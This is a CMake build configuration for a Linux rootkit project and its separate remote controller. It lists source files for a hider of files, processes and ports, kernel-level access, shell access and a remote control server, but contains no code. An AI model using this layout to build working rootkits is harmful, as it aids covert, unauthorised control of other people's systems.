cmake_minimum_required(VERSION 3.18)
project(Rootkit)

set(CMAKE_CXX_STANDARD 20)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -pthread")

add_executable(Rootkit

        ../basic/basic_rootkit.h
        ../basic/basic_rootkit.cpp

        ../basic/basic_plugin.h

        ../basic/mex_generator.h
        ../basic/mex_generator.cpp

        ../basic/network/basic_client_handler.h
        ../basic/network/basic_connection_establisher.h
        ../basic/network/basic_server.h
        ../basic/network/tcp_port.h

        ../basic/fs/basic_fs_access.h
        ../basic/process/basic_process_access.h
        ../basic/network/basic_network_access.h
        ../basic/shell/basic_cli_shell_access.h

        # linux file system access
        file_system_access/fs_access.cpp

        # linux network access
        network_access/basic_network_access.cpp

        network_access/linux_client_handler.cpp
        network_access/linux_client_handler.h
        network_access/linux_tcp_connection_establisher.cpp
        network_access/linux_tcp_connection_establisher.h

        network_access/linux_server.cpp
        network_access/linux_server.h
        network_access/linux_client.cpp
        network_access/linux_client.h

        # linux process access
        process_access/process_access.cpp

        # linux cli shell access
        cli_shell_access/cli_shell_access.cpp

        # files, process, and tcp ports hider
        hider/hider.cpp
        hider/hider.h

        # linux kernel level access
        kernel_access/kernel_access.cpp
        kernel_access/kernel_access.h
        kernel_access/operations_protocol.h
        kernel_access/msg_to_module.h
        kernel_access/msg_to_user.h

        # linux remote control server
        remote_control/remote_control_server.cpp
        remote_control/remote_control_server.h

        remote_control/msg_to_rootkit.h
        remote_control/msg_to_controller.h
        remote_control/protocol.h

        # main
        rootkit_main.cpp # contains main function

)

add_executable(Remote_controller

        ../basic/network/basic_client.h
        ../basic/network/tcp_port.h

        # linux plugins
        network_access/linux_client.cpp
        network_access/linux_client.h

        # remove control client
        remote_control/remote_control_client.cpp
        remote_control/remote_control_client.h

        # main
        remote_controller_main.cpp

)